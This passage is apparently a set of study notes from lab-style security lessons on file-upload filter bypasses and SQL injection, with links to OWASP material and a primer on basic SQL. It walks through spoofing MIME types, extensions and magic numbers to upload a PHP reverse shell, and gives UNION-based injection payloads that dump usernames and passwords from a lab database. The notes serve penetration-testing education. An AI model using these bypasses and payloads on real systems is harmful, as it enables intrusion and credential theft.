Conversely, as you may have guessed, a server-side script will be run on the server. Traditionally PHP was the predominant server-side language (with Microsoft's ASP for IIS coming in close second); however, in recent years, other options (C#, Node.js, Python, Ruby on Rails, and a variety of others) have become more widely used. Server-side filtering tends to be more difficult to bypass, as you don't have the code in front of you. As the code is executed on the server, in most cases it will also be impossible to bypass the filter completely; instead we have to form a payload which conforms to the filters in place, but still allows us to execute our code.

With that in mind, let's take a look at some different kinds of filtering.

Extension Validation:

File extensions are used (in theory) to identify the contents of a file. In practice they are very easy to change, so actually don't mean much; however, MS Windows still uses them to identify file types, although Unix based systems tend to rely on other methods, which we'll cover in a bit. Filters that check for extensions work in one of two ways. They either blacklist extensions (i.e. have a list of extensions which are not allowed) or they whitelist extensions (i.e. have a list of extensions which are allowed, and reject everything else).

File Type Filtering:

Similar to Extension validation, but more intensive, file type filtering looks, once again, to verify that the contents of a file are acceptable to upload. We'll be looking at two types of file type validation:

    MIME validation: MIME (Multipurpose Internet Mail Extension) types are used as an identifier for files -- originally when transfered as attachments over email, but now also when files are being transferred over HTTP(S). The MIME type for a file upload is attached in the header of the request, and looks something like this:

![image](https://user-images.githubusercontent.com/24814781/183402967-00b27e5e-851f-4e4c-abbc-cfea085ba613.png)

MIME types follow the format <type>/<subtype>. In the request above, you can see that the image "spaniel.jpg" was uploaded to the server. As a legitimate JPEG image, the MIME type for this upload was "image/jpeg". The MIME type for a file can be checked client-side and/or server-side; however, as MIME is based on the extension of the file, this is extremely easy to bypass.

Magic Number validation: Magic numbers are the more accurate way of determining the contents of a file; although, they are by no means impossible to fake. The "magic number" of a file is a string of bytes at the very beginning of the file content which identify the content. For example, a PNG file would have these bytes at the very top of the file: 89 50 4E 47 0D 0A 1A 0A.

![image](https://user-images.githubusercontent.com/24814781/183403252-2f5549fe-5ac4-426c-8551-ccd2a1c1859a.png)

Unlike Windows, Unix systems use magic numbers for identifying files; however, when dealing with file uploads, it is possible to check the magic number of the uploaded file to ensure that it is safe to accept. This is by no means a guaranteed solution, but it's more effective than checking the extension of a file.

File Length Filtering:

File length filters are used to prevent huge files from being uploaded to the server via an upload form (as this can potentially starve the server of resources). In most cases this will not cause us any issues when we upload shells; however, it's worth bearing in mind that if an upload form only expects a very small file to be uploaded, there may be a length filter in place to ensure that the file length requirement is adhered to. As an example, our fully fledged PHP reverse shell from the previous task is 5.4Kb big -- relatively tiny, but if the form expects a maximum of 2Kb then we would need to find an alternative shell to upload.

File Name Filtering:

As touched upon previously, files uploaded to a server should be unique. Usually this would mean adding a random aspect to the file name, however, an alternative strategy would be to check if a file with the same name already exists on the server, and give the user an error if so. Additionally, file names should be sanitised on upload to ensure that they don't contain any "bad characters", which could potentially cause problems on the file system when uploaded (e.g. null bytes or forward slashes on Linux, as well as control characters such as ; and potentially unicode characters). What this means for us is that, on a well administered system, our uploaded files are unlikely to have the same name we gave them before uploading, so be aware that you may have to go hunting for your shell in the event that you manage to bypass the content filtering.

File Content Filtering:
More complicated filtering systems may scan the full contents of an uploaded file to ensure that it's not spoofing its extension, MIME type and Magic Number. This is a significantly more complex process than the majority of basic filtration systems employ, and thus will not be covered in this room.

It's worth noting that none of these filters are perfect by themselves -- they will usually be used in conjunction with each other, providing a multi-layered filter, thus increasing the security of the upload significantly. Any of these filters can all be applied client-side, server-side, or both.

Similarly, different frameworks and languages come with their own inherent methods of filtering and validating uploaded files. As a result, it is possible for language specific exploits to appear; for example, until PHP major version five, it was possible to bypass an extension filter by appending a null byte, followed by a valid extension, to the malicious .php file. More recently it was also possible to inject PHP code into the exif data of an otherwise valid image file, then force the server to execute it. These are things that you are welcome to research further, should you be interested.


#### Bypassing Client Side Filtering

We'll begin with the first (and weakest) line of defence: Client-Side Filtering.

As mentioned previously, client-side filtering tends to be extremely easy to bypass, as it occurs entirely on a machine that you control. When you have access to the code, it's very easy to alter it.

There are four easy ways to bypass your average client-side file upload filter:

1. Turn off Javascript in your browser -- this will work provided the site doesn't require Javascript in order to provide basic functionality. If turning off Javascript completely will prevent the site from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.

2. Intercept and modify the incoming page. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run. The process for this will be covered below.

3. Intercept and modify the file upload. Where the previous method works before the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter). Again, we will cover the process for using this method in the course of the task.

4. Send the file directly to the upload point. Why use the webpage with the filter, when you can send the file directly using a tool like curl? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like this: 
```
curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
```

    To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.

We will be covering methods two and three in depth below.

Let's assume that, once again, we have found an upload page on a website:

![image](https://user-images.githubusercontent.com/24814781/183404950-09b715e7-3fdb-4a16-bd1f-bbba86a6aa93.png)

As always, we'll take a look at the source code. Here we see a basic Javascript function checking for the MIME type of uploaded files:

![image](https://user-images.githubusercontent.com/24814781/183404985-807540b7-1234-4408-9d1a-c7b0c4eee101.png)

In this instance we can see that the filter is using a whitelist to exclude any MIME type that isn't image/jpeg.

Our next step is to attempt a file upload -- as expected, if we choose a JPEG, the function accepts it. Anything else and the upload is rejected.

Having established this, let's start Burpsuite and reload the page. We will see our own request to the site, but what we really want to see is the server's response, so right click on the intercepted data, scroll down to "Do Intercept", then select "Response to this request":

![image](https://user-images.githubusercontent.com/24814781/183405050-e0cb8734-a4d0-42c7-9290-369381557921.png)

When we click the "Forward" button at the top of the window, we will then see the server's response to our request. Here we can delete, comment out, or otherwise break the Javascript function before it has a chance to load:

![image](https://user-images.githubusercontent.com/24814781/183405220-4a1eb323-ff05-4855-90ad-428ab656706b.png)

Having deleted the function, we once again click "Forward" until the site has finished loading, and are now free to upload any kind of file to the website:

![image](https://user-images.githubusercontent.com/24814781/183405339-7c26c788-f4ac-4cec-83d8-f7a611d76d80.png)

It's worth noting here that Burpsuite will not, by default, intercept any external Javascript files that the web page is loading. If you need to edit a script which is not inside the main page being loaded, you'll need to go to the "Options" tab at the top of the Burpsuite window, then under the "Intercept Client Requests" section, edit the condition of the first line to remove ^js$|:

![image](https://user-images.githubusercontent.com/24814781/183405921-4ab5a8ac-c7a4-4ce3-9a01-6910502c5bf0.png)

We've already bypassed this filter by intercepting and removing it prior to the page being loaded, but let's try doing it by uploading a file with a legitimate extension and MIME type, then intercepting and correcting the upload with Burpsuite.

Having reloaded the webpage to put the filter back in place, let's take the reverse shell that we used before and rename it to be called "shell.jpg". As the MIME type (based on the file extension) automatically checks out, the Client-Side filter lets our payload through without complaining:

![image](https://user-images.githubusercontent.com/24814781/183406037-1e213502-9447-4078-b11b-218b2401355d.png)

Once again we'll activate our Burpsuite intercept, then click "Upload" and catch the request:

![image](https://user-images.githubusercontent.com/24814781/183406079-a80c2606-b007-4c1f-a444-82cd3c233402.png)

Observe that the MIME type of our PHP shell is currently image/jpeg. We'll change this to text/x-php, and the file extension from .jpg to .php, then forward the request to the server:

![image](https://user-images.githubusercontent.com/24814781/183406118-66a7ee97-e762-48e5-8a87-eb8befdc3b49.png)

Now, when we navigate to <example website> http://demo.uploadvulns.thm/uploads/shell.php having set up a netcat listener, we receive a connection from the shell!

![image](https://user-images.githubusercontent.com/24814781/183406271-17cba780-f71d-4af0-b1ee-679e9f94a76a.png)



#### Bypassing Server Side Filtering File Extensions

Time to turn things up another notch!

Client-side filters are easy to bypass -- you can see the code for them, even if it's been obfuscated and needs processed before you can read it; but what happens when you can't see or manipulate the code? Well, that's a server-side filter. In short, we have to perform a lot of testing to build up an idea of what is or is not allowed through the filter, then gradually put together a payload which conforms to the restrictions.

For the first part of this task we'll take a look at a website that's using a blacklist for file extensions as a server side filter. There are a variety of different ways that this could be coded, and the bypass we use is dependent on that. In the real world we wouldn't be able to see the code for this, but for this example, it will be included here:
```
<?php
    //Get the extension
    $extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];
    //Check the extension against the blacklist -- .php and .phtml
    switch($extension){
        case "php":
        case "phtml":
        case NULL:
            $uploadFail = True;
            break;
        default:
            $uploadFail = False;
    }
?>
```

In this instance, the code is looking for the last period (.) in the file name and uses that to confirm the extension, so that is what we'll be trying to bypass here. Other ways the code could be working include: searching for the first period in the file name, or splitting the file name at each period and checking to see if any blacklisted extensions show up. We'll cover this latter case later on, but in the meantime, let's focus on the code we've got here.

We can see that the code is filtering out the .php and .phtml extensions, so if we want to upload a PHP script we're going to have to find another extension. The wikipedia page
```
https://en.wikipedia.org/wiki/PHP
```
for PHP gives us a few common extensions that we can try; however, there are actually a variety of other more rarely used extensions available that webservers may nonetheless still recognise. These include: .php3, .php4, .php5, .php7, .phps, .php-s, .pht and .phar. Many of these bypass the filter (which only blocks.php and .phtml), but it appears that the server is configured not to recognise them as PHP files, as in the below example: 

![image](https://user-images.githubusercontent.com/24814781/183414872-3466e7c4-465f-43e7-816d-3d573ed62ac6.png)

This is actually the default for Apache2 servers, at the time of writing; however, the sysadmin may have changed the default configuration (or the server may be out of date), so it's well worth trying.

Eventually we find that the .phar extension bypasses the filter -- and works -- thus giving us our shell:

![image](https://user-images.githubusercontent.com/24814781/183415139-e01ac835-50d5-4270-a7f6-e4661f5ed643.png)

Let's have a look at another example, with a different filter. This time we'll do it completely black-box: i.e. without the source code.

Once again, we have our upload form:

![image](https://user-images.githubusercontent.com/24814781/183415216-b71a4b80-f726-4ae1-869e-65c44ab476da.png)

Ok, we'll start by scoping this out with a completely legitimate upload. Let's try uploading the spaniel.jpg image from before:

![image](https://user-images.githubusercontent.com/24814781/183415264-68bca0b3-b765-4ad2-9ee4-a46591a8496e.png)

Well, that tells us that JPEGS are accepted at least. Let's go for one that we can be pretty sure will be rejected (shell.php):

![image](https://user-images.githubusercontent.com/24814781/183415314-ff9cffd8-2f5d-43c0-8223-156c73fc4431.png)

Can't say that was unexpected.

From here we enumerate further, trying the techniques from above and just generally trying to get an idea of what the filter will accept or reject.

In this case we find that there are no shell extensions that both execute, and are not filtered, so it's back to the drawing board.

In the previous example we saw that the code was using the pathinfo() PHP function to get the last few characters after the ., but what happens if it filters the input slightly differently?

Let's try uploading a file called shell.jpg.php. We already know that JPEG files are accepted, so what if the filter is just checking to see if the .jpg file extension is somewhere within the input?

Pseudocode for this kind of filter may look something like this:

```
ACCEPT FILE FROM THE USER -- SAVE FILENAME IN VARIABLE userInput
IF STRING ".jpg" IS IN VARIABLE userInput:
    SAVE THE FILE
ELSE:
    RETURN ERROR MESSAGE
```

When we try to upload our file we get a success message. Navigating to the /uploads directory confirms that the payload was successfully uploaded:

![image](https://user-images.githubusercontent.com/24814781/183415566-a02b30eb-0c7f-418c-898d-c4c72c201996.png)

Activating it, we receive our shell:

![image](https://user-images.githubusercontent.com/24814781/183415594-4a61a386-d20d-4239-ab1b-1e770a5613c8.png)

This is by no means an exhaustive list of upload vulnerabilities related to file extensions. As with everything in hacking, we are looking to exploit flaws in code that others have written; this code may very well be uniquely written for the task at hand. This is the really important point to take away from this task: there are a million different ways to implement the same feature when it comes to programming -- your exploitation must be tailored to the filter at hand. The key to bypassing any kind of server side filter is to enumerate and see what is allowed, as well as what is blocked; then try to craft a payload which can pass the criteria the filter is looking for.


#### Bypassing Server Side Filtering Magic Numbers

We've already had a look at server-side extension filtering, but let's also take the opportunity to see how magic number checking could be implemented as a server-side filter.

As mentioned previously, magic numbers are used as a more accurate identifier of files. The magic number of a file is a string of hex digits, and is always the very first thing in a file. Knowing this, it's possible to use magic numbers to validate file uploads, simply by reading those first few bytes and comparing them against either a whitelist or a blacklist. Bear in mind that this technique can be very effective against a PHP based webserver; however, it can sometimes fail against other types of webserver (hint hint).

Let's take a look at an example. As per usual, we have an upload page:

![image](https://user-images.githubusercontent.com/24814781/183417715-2ee54fdc-8269-4596-8d96-e3c576e43d75.png)

As expected, if we upload our standard shell.php file, we get an error; however, if we upload a JPEG, the website is fine with it. All running as per expected so far.

From the previous attempt at an upload, we know that JPEG files are accepted, so let's try adding the JPEG magic number to the top of our shell.php file. A quick look at the list of file signatures on Wikipedia
```
https://en.wikipedia.org/wiki/List_of_file_signatures
```

shows us that there are several possible magic numbers of JPEG files. It shouldn't matter which we use here, so let's just pick one (FF D8 FF DB). We could add the ASCII representation of these digits (ÿØÿÛ) directly to the top of the file but it's often easier to work directly with the hexadecimal representation, so let's cover that method.

Before we get started, let's use the Linux file command to check the file type of our shell:

![image](https://user-images.githubusercontent.com/24814781/183418216-60bce4c2-c867-4bdb-837f-8a2112efb458.png)

As expected, the command tells us that the filetype is PHP. Keep this in mind as we proceed with the explanation.

We can see that the magic number we've chosen is four bytes long, so let's open up the reverse shell script and add four random characters on the first line. These characters do not matter, so for this example we'll just use four "A"s:

![image](https://user-images.githubusercontent.com/24814781/183418261-066cd6c9-9f98-4e5f-86ee-7ce9e15814ae.png)

Save the file and exit. Next we're going to reopen the file in hexeditor (which comes by default on Kali), or any other tool which allows you to see and edit the shell as hex. In hexeditor the file looks like this:

![image](https://user-images.githubusercontent.com/24814781/183418293-b6125cd3-f41a-4211-aca9-d9cbdc353510.png)

Note the four bytes in the red box: they are all 41, which is the hex code for a capital "A" -- exactly what we added at the top of the file previously.

Change this to the magic number we found earlier for JPEG files: FF D8 FF DB

![image](https://user-images.githubusercontent.com/24814781/183418357-045705c8-c27c-4b16-a9ff-d002d8b21f9e.png)

Now if we save and exit the file (Ctrl + x), we can use file once again, and see that we have successfully spoofed the filetype of our shell:

![image](https://user-images.githubusercontent.com/24814781/183418397-a1a0cf25-5685-4a27-88ae-50b04408d6d5.png)

Perfect. Now let's try uploading the modified shell and see if it bypasses the filter!

![image](https://user-images.githubusercontent.com/24814781/183418422-59e59651-84ce-4482-b2ee-c188d0f28dba.png)

There we have it -- we bypassed the server-side magic number filter and received a reverse shell. 


#### Example Methodology

We've seen various different types of filter now -- both client side and server side -- as well as the general methodology for file upload attacks. So let's take the opportunity to discuss an example methodology for approaching this kind of challenge in a little more depth. You may develop your own alternative to this method, however, if you're new to this kind of attack, you may find the following information useful.

We'll look at this as a step-by-step process. Let's say that we've been given a website to perform a security audit on.

1. The first thing we would do is take a look at the website as a whole. Using browser extensions such as the aforementioned Wappalyzer (or by hand) we would look for indicators of what languages and frameworks the web application might have been built with. Be aware that Wappalyzer is not always 100% accurate. A good start to enumerating this manually would be by making a request to the website and intercepting the response with Burpsuite. Headers such as server or x-powered-by can be used to gain information about the server. We would also be looking for vectors of attack, like, for example, an upload page. 

2. Having found an upload page, we would then aim to inspect it further. Looking at the source code for client-side scripts to determine if there are any client-side filters to bypass would be a good thing to start with, as this is completely in our control.

3. We would then attempt a completely innocent file upload. From here we would look to see how our file is accessed. In other words, can we access it directly in an uploads folder? Is it embedded in a page somewhere? What's the naming scheme of the website? This is where tools such as Gobuster might come in if the location is not immediately obvious. This step is extremely important as it not only improves our knowledge of the virtual landscape we're attacking, it also gives us a baseline "accepted" file which we can base further testing on. 
	* An important Gobuster switch here is the -x switch, which can be used to look for files with specific extensions. For example, if you added -x php,txt,html to your Gobuster command, the tool would append .php, .txt, and .html to each word in the selected wordlist, one at a time. This can be very useful if you've managed to upload a payload and the server is changing the name of uploaded files.
	
4. Having ascertained how and where our uploaded files can be accessed, we would then attempt a malicious file upload, bypassing any client-side filters we found in step two. We would expect our upload to be stopped by a server side filter, but the error message that it gives us can be extremely useful in determining our next steps.

Assuming that our malicious file upload has been stopped by the server, here are some ways to ascertain what kind of server-side filter may be in place:

* If you can successfully upload a file with a totally invalid file extension (e.g. testingimage.invalidfileextension) then the chances are that the server is using an extension blacklist to filter out executable files. If this upload fails then any extension filter will be operating on a whitelist.
    
* Try re-uploading your originally accepted innocent file, but this time change the magic number of the file to be something that you would expect to be filtered. If the upload fails then you know that the server is using a magic number based filter.
    
* As with the previous point, try to upload your innocent file, but intercept the request with Burpsuite and change the MIME type of the upload to something that you would expect to be filtered. If the upload fails then you know that the server is filtering based on MIME types.

* Enumerating file length filters is a case of uploading a small file, then uploading progressively bigger files until you hit the filter. At that point you'll know what the acceptable limit is. If you're very lucky then the error message of original upload may outright tell you what the size limit is. Be aware that a small file length limit may prevent you from uploading the reverse shell we've been using so far.



-----------------------------------------------------------------------------------------------------------------



### owasp top 10

```
https://owasp.org/
```


#### OWASP favicon database
```
https://wiki.owasp.org/index.php/OWASP_favicon_database
```
```
curl https://<path leading to the favicon>/favicon.ico | md5sum	
```
then look up the favicon at the owasp database 



----------------------------------------------------------------------------------------------------------------



### Broken Access Control
Common Weakness Enumerations (CWEs) included are 
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
CWE-201: Insertion of Sensitive Information Into Sent Data
CWE-352: Cross-Site Request Forgery.
```
https://owasp.org/Top10/A01_2021-Broken_Access_Control/
```
-----------------------------------------------------------------------------------------------------------------
	
### Cryptographic Failures 
Notable Common Weakness Enumerations (CWEs) included are 
CWE-259: Use of Hard-coded Password
CWE-327: Broken or Risky Crypto Algorithm
CWE-331 Insufficient Entropy.
```
https://owasp.org/Top10/A02_2021-Cryptographic_Failures/
```
-----------------------------------------------------------------------------------------------------------------


### Injection
Notable Common Weakness Enumerations (CWEs) included are 
CWE-79: Cross-site Scripting
CWE-89: SQL Injection
CWE-73: External Control of File Name or Path
```
https://owasp.org/Top10/A03_2021-Injection/
```
```
https://portswigger.net/web-security/cross-site-scripting
```
```
https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
```
```
file:///tmp/mozilla_kali0/cheat-sheet.pdf
```
```
https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
```
```
https://portswigger.net/web-security/sql-injection/cheat-sheet
```
```
https://book.hacktricks.xyz/pentesting-web/sql-injection
```

### sql cheat sheet and resources
```
https://github.com/payloadbox/sql-injection-payload-list
```
```
https://book.hacktricks.xyz/pentesting-web/sql-injection
``` 


### basic SQL  

What is a database?

A database is a way of electronically storing collections of data in an organised manner. A database is controlled by a DBMS which is an acronym for  Database Management System, DBMS's fall into two camps Relational or Non-Relational, the focus of this room will be on Relational databases,  some common one's you'll come across are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite. We'll explain the difference between Relational and Non-Relational databases at the end of this task but first, it's important to learn a few terms.

Within a DBMS, you can have multiple databases, each containing its own set of related data. For example, you may have a database called "shop". Within this database, you want to store information about products available to purchase, users who have signed up to your online shop, and information about the orders you've received. You'd store this information separately in the database using something called tables, the tables are identified with a unique name for each one. You can see this structure in the diagram below, but you can also see how a business might have other separate databases to store staff information or the accounts team.

![image](https://user-images.githubusercontent.com/24814781/181730683-ca25cf99-ccf6-421a-b2b0-22923d739ce1.png)

Columns:

Each column, better referred to as a field has a unique name per table. When creating a column, you also set the type of data it will contain, common ones being integer (numbers), strings (standard text) or dates. Some databases can contain much more complex data, such as geospatial, which contains location information. Setting the data type also ensures that incorrect information isn't stored, such as the string "hello world" being stored in a column meant for dates. If this happens, the database server will usually produce an error message. A column containing an integer can also have an auto-increment feature enabled; this gives each row of data a unique number that grows (increments) with each subsequent row, doing so creates what is called a key field, a key field has to be unique for every row of data which can be used to find that exact row in SQL queries.


Rows:

Rows or records are what contains the individual lines of data. When you add data to the table, a new row/record is created, and when you delete data, a row/record is removed.



Relational Vs Non-Relational Databases:
A relational database, stores information in tables and often the tables have shared information between them, they use columns to specify and define the data being stored and rows to actually store the data. The tables will often contain a column that has a unique ID (primary key) which will then be used in other tables to reference it and cause a relationship between the tables, hence the name relational database.


Non-relational databases sometimes called NoSQL on the other hand is any sort of database that doesn't use tables, columns and rows to store the data, a specific database layout doesn't need to be constructed so each row of data can contain different information which can give more flexibility over a relational database.  Some popular databases of this type are MongoDB, Cassandra and ElasticSearch.

SQL (Structured Query Language) is a feature-rich language used for querying databases, these SQL queries are better referred to as statements.


The simplest of the commands which we'll cover in this task is used to retrieve (select), update, insert and delete data. Although somewhat similar, some databases servers have their own syntax and slight changes to how things work. All of these examples are based on a MySQL database. After learning the lessons, you'll easily be able to search for alternative syntax online for the different servers. It's worth noting that SQL syntax is not case sensitive.

SELECT

The first query type we'll learn is the SELECT query used to retrieve data from the database.

```
select * from users;
```

![image](https://user-images.githubusercontent.com/24814781/181731922-dda9ff50-aa9c-4976-8d42-81aa94acc4ff.png)

The first-word SELECT tells the database we want to retrieve some data, the * tells the database we want to receive back all columns from the table. For example, the table may contain three columns (id, username and password). "from users" tells the database we want to retrieve the data from the table named users. Finally, the semicolon at the end tells the database that this is the end of the query.  


The next query is similar to the above, but this time, instead of using the * to return all columns in the database table, we are just requesting the username and password field.

```
select username,password from users;
```

![image](https://user-images.githubusercontent.com/24814781/181732264-93a96d01-4d65-44f1-8cbb-064b10fa9bee.png)


The following query, like the first, returns all the columns by using the * selector and then the "LIMIT 1" clause forces the database only to return one row of data. Changing the query to "LIMIT 1,1" forces the query to skip the first result, and then "LIMIT 2,1" skips the first two results, and so on. You need to remember the first number tells the database how many results you wish to skip, and the second number tells the database how many rows to return.

```
select * from users LIMIT 1;
```

![image](https://user-images.githubusercontent.com/24814781/181732646-c1d92391-5847-433a-a95a-2db1c153cfde.png)


Lastly, we're going to utilise the where clause; this is how we can finely pick out the exact data we require by returning data that matches our specific clauses:

```
select * from users where username='admin';
```

![image](https://user-images.githubusercontent.com/24814781/181732844-fd4072b6-bc52-4c52-a842-706493d4639f.png)


This will only return the rows where the username is equal to admin.

```
select * from users where username != 'admin';
```

![image](https://user-images.githubusercontent.com/24814781/181733026-c5d5623e-665d-4e08-b333-7ad896a35481.png)

This will only return the rows where the username is NOT equal to admin.

```
select * from users where username='admin' or username='jon';
```

![image](https://user-images.githubusercontent.com/24814781/181733283-0393f3a0-f974-4e35-9eb7-b0b036beafc3.png)

This will only return the rows where the username is either equal to admin or jon. 

```
select * from users where username='admin' and password='p4ssword';
```

![image](https://user-images.githubusercontent.com/24814781/181733401-954f7b20-5cc2-4cd5-a8cd-a19bf58101e8.png)

This will only return the rows where the username is equal to admin, and the password is equal to p4ssword.


Using the like clause allows you to specify data that isn't an exact match but instead either starts, contains or ends with certain characters by choosing where to place the wildcard character represented by a percentage sign %.

```
select * from users where username like 'a%';
```

![image](https://user-images.githubusercontent.com/24814781/181733685-c02a1f84-42bb-465b-a0ab-e509252e6077.png)

This returns any rows with username beginning with the letter a.

```
select * from users where username like '%n';
```

![image](https://user-images.githubusercontent.com/24814781/181733770-86fe4f8f-1b57-4538-9843-32bf355165b4.png)


This returns any rows with username ending with the letter n.

```
select * from users where username like '%mi%';
```

![image](https://user-images.githubusercontent.com/24814781/181733893-49efaaa5-665f-4001-b2a6-f27d1af019a1.png)

UNION

The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type and the column order has to be the same. This might sound not very clear, so let's use the following analogy. Say a company wants to create a list of addresses for all customers and suppliers to post a new catalogue. We have one table called customers with the following contents: 

![image](https://user-images.githubusercontent.com/24814781/181734143-c5c3c958-6095-48f5-a4ab-64862731cfb4.png)


And another called suppliers with the following contents:

![image](https://user-images.githubusercontent.com/24814781/181734193-cf3cbdc2-a034-4ad0-923c-ac3a9d3dce40.png)


Using the following SQL Statement, we can gather the results from the two tables and put them into one result set:

```
SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
```

![image](https://user-images.githubusercontent.com/24814781/181734366-e5a8e203-ec50-4974-bba9-9f68c0b31b02.png)

INSERT

The INSERT statement tells the database we wish to insert a new row of data into the table. "into users" tells the database which table we wish to insert the data into, "(username,password)" provides the columns we are providing data for and then "values ('bob','password');" provides the data for the previously specified columns.

```
insert into users (username,password) values ('bob','password123');
```

![image](https://user-images.githubusercontent.com/24814781/181734580-f6a1eb8e-1395-4823-818f-c683ebacc30c.png)

UPDATE

The UPDATE statement tells the database we wish to update one or more rows of data within a table. You specify the table you wish to update using "update %tablename% SET" and then select the field or fields you wish to update as a comma-separated list such as "username='root',password='pass123'" then finally similar to the SELECT statement, you can specify exactly which rows to update using the where clause such as "where username='admin;".

```
update users SET username='root',password='pass123' where username='admin';
```

![image](https://user-images.githubusercontent.com/24814781/181734707-7e04e537-7f68-4aec-ab8c-9b48c330e4ec.png)


DELETE

The DELETE statement tells the database we wish to delete one or more rows of data. Apart from missing the columns you wish to be returned, the format of this query is very similar to the SELECT. You can specify precisely which data to delete using the where clause and the number of rows to be deleted using the LIMIT clause.

```
delete from users where username='martin';
```

![image](https://user-images.githubusercontent.com/24814781/181735171-c1d88d3b-556c-4b18-9a19-519ad383bc3b.png)


delete from users;


Because no WHERE clause was being used in the query, all the data is deleted in the table.

![image](https://user-images.githubusercontent.com/24814781/181735602-89133a1b-1641-4cb2-9214-677e910f5176.png)


### What is SQL Injection

What is SQL Injection?
The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.

What does it look like?
Take the following scenario where you've come across an online blog, and each blog entry has a unique id number. The blog entries may be either set to public or private depending on whether they're ready for public release. The URL for each blog entry may look something like this:

```
https://website.thm/blog?id=1
```

From the URL above, you can see that the blog entry been selected comes from the id parameter in the query string. The web application needs to retrieve the article from the database and may use an SQL statement that looks something like the following:

```
SELECT * from blog where id=1 and private=0 LIMIT 1;
```

From what you've learned in the previous task, you should be able to work out that the SQL statement above is looking in the blog table for an article with the id number of 1 and the private column set to 0, which means it's able to be viewed by the public and limits the results to only one match.

As was mentioned at the start of this task, SQL Injection is introduced when user input is introduced into the database query. In this instance, the id parameter from the query string is used directly in the SQL query.

Let's pretend article id 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:

```
https://website.thm/blog?id=2;--
```

Which would then, in turn, produce the SQL statement:

```
SELECT * from blog where id=2;-- and private=0 LIMIT 1;
```

The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the query:

```
SELECT * from blog where id=2;--
```

This was just one example of an SQL Injection vulnerability of a type called In-Band SQL Injection; there are 3 types in total In-Band, Blind and Out Of Band.


### In Band SQLi 

In-Band SQL Injection

In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.


Error-Based SQL Injection

This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 


Union-Based SQL Injection

This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

Practical tips and example:

The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).


Try typing an apostrophe ( ' ) after the id=1 and press enter. And you'll see this returns an SQL error informing you of an error in your syntax. The fact that you've received this error message confirms the existence of an SQL Injection vulnerability. We can now exploit this vulnerability and use the error messages to learn more about the database structure. 


The first thing we need to do is return data to the browser without displaying an error message. Firstly we'll try the UNION operator so we can receive an extra result of our choosing. Try setting the mock browsers id parameter to:

```
1 UNION SELECT 1
```

This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query. So let's try again but add another column:

```
1 UNION SELECT 1,2
```

Same error again, so let's repeat by adding another column:

```
1 UNION SELECT 1,2,3
```

Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article id from 1 to 0.

```
0 UNION SELECT 1,2,3
```

You'll now see the article is just made up of the result from the UNION select returning the column values 1, 2, and 3. We can start using these returned values to retrieve more useful information. First, we'll get the database name that we have access to:

```
0 UNION SELECT 1,2,database()
```

You'll now see where the number 3 was previously displayed; it now shows the name of the database, which is sqli_one.


Our next query will gather a list of tables that are in this database.

```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

There are a couple of new things to learn in this query. Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 


As the first level aims to discover Martin's password, the staff_users table is what is of interest to us. We can utilise the information_schema database again to find the structure of this table using the below query.

```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the table_name column has a value of staff_users.


The query results provide three columns for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.

```
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

Again we use the group_concat method to return all of the rows into one string and to make it easier to read. We've also added ,':', to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.

### Blind SQLi Authentication Bypass 

Blind SQLi

Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successful enumerate a whole database.


Authentication Bypass

One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login. 


